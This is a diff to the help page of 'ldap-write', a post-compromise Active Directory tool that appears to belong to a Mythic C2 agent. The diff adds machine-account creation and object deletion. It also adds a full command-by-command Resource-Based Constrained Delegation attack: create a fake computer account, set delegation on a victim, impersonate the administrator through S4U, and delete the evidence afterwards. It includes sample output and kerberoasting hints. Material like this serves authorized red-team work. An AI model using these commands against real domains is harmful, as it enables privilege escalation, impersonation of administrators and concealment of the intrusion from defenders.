@@ -7,7 +7,7 @@ hidden = false
 
 ## Summary
 
-Modify Active Directory objects via LDAP. Add or remove group members, set or delete attributes, manage SPNs, enable/disable accounts, and set passwords. Complements `ldap-query` by adding write capabilities for post-compromise AD manipulation.
+Modify Active Directory objects via LDAP. Add or remove group members, set or delete attributes, manage SPNs, enable/disable accounts, set passwords, create machine accounts (for RBCD attacks), and delete objects. Complements `ldap-query` by adding write capabilities for post-compromise AD manipulation.
 
 ## Arguments
 
@@ -18,7 +18,7 @@ Modify Active Directory objects via LDAP. Add or remove group members, set or de
 | target | Yes | | Object to modify (sAMAccountName, CN, or full DN) |
 | group | Varies | | Group name for add-member/remove-member |
 | attr | Varies | | Attribute name for set-attr/add-attr/remove-attr |
-| value | Varies | | Attribute value for set-attr/add-attr/remove-attr/set-spn/set-password |
+| value | Varies | | Attribute value for set-attr/add-attr/remove-attr/set-spn/set-password/add-computer |
 | username | No | | LDAP bind username (UPN format: user@domain.local) |
 | password | No | | LDAP bind password |
 | base_dn | No | auto | LDAP search base (auto-detected from RootDSE) |
@@ -38,6 +38,8 @@ Modify Active Directory objects via LDAP. Add or remove group members, set or de
 | disable | Disable an account (set ACCOUNTDISABLE in UAC) | target |
 | enable | Enable a disabled account (clear ACCOUNTDISABLE) | target |
 | set-password | Set account password (requires LDAPS) | target, value, use_tls |
+| add-computer | Create a machine account (for RBCD attacks) | target, value |
+| delete-object | Delete an AD object (cleanup after RBCD) | target |
 
 ## Usage
 
@@ -71,6 +73,16 @@ ldap-write -action set-password -server dc01 -target jsmith -value "NewP@ssw0rd!
 ldap-write -action set-attr -server dc01 -target jsmith -attr description -value "Service account" -username admin@domain.local -password pass
 ```
 
+**Create machine account (for RBCD):**
+```
+ldap-write -action add-computer -server dc01 -target FAKEPC01 -value "Password123!" -username user@domain.local -password pass
+```
+
+**Delete an object (cleanup):**
+```
+ldap-write -action delete-object -server dc01 -target FAKEPC01$ -username admin@domain.local -password pass
+```
+
 ## Example Output
 
 **add-member:**
@@ -79,6 +91,19 @@ ldap-write -action set-attr -server dc01 -target jsmith -attr description -value
 [+] Added:  CN=arya.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
 [+] To:     CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local
 [+] Server: 192.168.100.52
+```
+
+**add-computer:**
+```
+[*] LDAP Computer Account Creation (T1136.002)
+[+] DN:            CN=FAKEPC01,CN=Computers,DC=north,DC=sevenkingdoms,DC=local
+[+] sAMAccountName: FAKEPC01$
+[+] Password:      (set)
+[+] UAC:           WORKSTATION_TRUST_ACCOUNT (0x1000)
+[+] Server:        192.168.100.52
+
+[!] Use with RBCD: ldap-write -action set-attr -target <victim> -attr msDS-AllowedToActOnBehalfOfOtherIdentity ...
+[!] Then: ticket -action s4u -target <victim> -impersonate administrator
 ```
 
 **set-spn:**
@@ -91,13 +116,40 @@ ldap-write -action set-attr -server dc01 -target jsmith -attr description -value
 [!] Account is now kerberoastable — use kerberoast to extract TGS hash.
 ```
 
+## RBCD Attack Workflow
+
+Resource-Based Constrained Delegation (RBCD) is a powerful privilege escalation technique:
+
+1. **Create a machine account** (default domain users can create up to 10):
+   ```
+   ldap-write -action add-computer -server dc01 -target FAKEPC01 -value "Password123!" -username user@domain.local -password pass
+   ```
+
+2. **Set RBCD delegation** on the target (requires GenericWrite/GenericAll on target):
+   ```
+   ldap-write -action set-attr -server dc01 -target targetserver -attr msDS-AllowedToActOnBehalfOfOtherIdentity -value <security descriptor> -username user@domain.local -password pass
+   ```
+
+3. **Perform S4U** to get a service ticket as admin:
+   ```
+   ticket -action s4u -target targetserver -impersonate administrator
+   ```
+
+4. **Cleanup** — delete the machine account:
+   ```
+   ldap-write -action delete-object -server dc01 -target FAKEPC01$ -username user@domain.local -password pass
+   ```
+
 ## Operational Notes
 
-- Uses `go-ldap/v3` for LDAP modify operations
+- Uses `go-ldap/v3` for LDAP add/modify/delete operations
 - Target objects are resolved from sAMAccountName to DN automatically
 - UPN format (`user@domain.local`) recommended for authentication
 - `set-password` requires LDAPS (encrypted connection) — AD rejects password changes over plain LDAP
 - Password is encoded as UTF-16LE with surrounding quotes per AD's `unicodePwd` attribute format
+- `add-computer` creates objects in the default CN=Computers container
+- `add-computer` requires ms-DS-MachineAccountQuota > 0 (default: 10 for domain users)
+- `delete-object` requires Delete permission on the target object
 - All modifications generate Mythic artifacts for tracking
 - Write operations require appropriate AD permissions (Domain Admin, delegated rights, or object owner)
 
@@ -105,3 +157,4 @@ ldap-write -action set-attr -server dc01 -target jsmith -attr description -value
 
 - **T1098** — Account Manipulation
 - **T1098.005** — Account Manipulation: Device Registration
+- **T1136.002** — Create Account: Domain Account
